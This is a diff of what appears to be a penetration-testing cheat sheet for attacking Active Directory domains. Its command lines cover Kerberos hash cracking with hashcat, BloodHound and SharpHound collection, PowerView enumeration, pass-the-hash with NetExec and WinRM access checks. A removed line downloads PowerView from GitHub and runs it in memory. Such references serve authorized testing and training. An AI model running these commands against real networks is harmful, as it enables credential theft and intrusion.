@@ -140,15 +140,20 @@ hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt
 nxc ldap $IP -u $USER -p $PASS --bloodhound --collection All
 ```
 
+## SharpHound (Kali Source)
+```
+/usr/share/sharphound/SharpHound.exe
+```
+
 ## Run SharpHound on Windows target
 ```cmd
 # Add -d domain.local OR --zipfilename output.zip as needed
 .\SharpHound.exe -c All
 ```
 
-## Download PowerView for AD enumeration
-```powershell
-IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
+## PowerView.ps1 (Source)
+```
+https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
 ```
 
 ## Get domain information with PowerView
@@ -190,15 +195,13 @@ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/
 Invoke-AllChecks
 ```
 
-## Test WinRM access
+## Test WinRM access with NetExec
 ```bash
-# evil-winrm for shell OR netexec for quick validation
-evil-winrm -i $IP -u username -p password
+netexec winrm -i $IP -u username -p password
 ```
 
 ## Pass-the-hash with NetExec
 ```bash
-# Change protocol: smb OR winrm
 netexec smb $IP -u username -H ntlmhash
 ```
 
@@ -238,6 +241,11 @@ Get-DomainTrustMapping
 ## Find computers with unconstrained delegation
 ```powershell
 Get-DomainComputer -Unconstrained
+```
+
+## Synchronize time with DC (Necessary for Kerberos)
+```
+ntpdate $IP
 ```
 
 ## Find users with SPN set for Kerberoasting
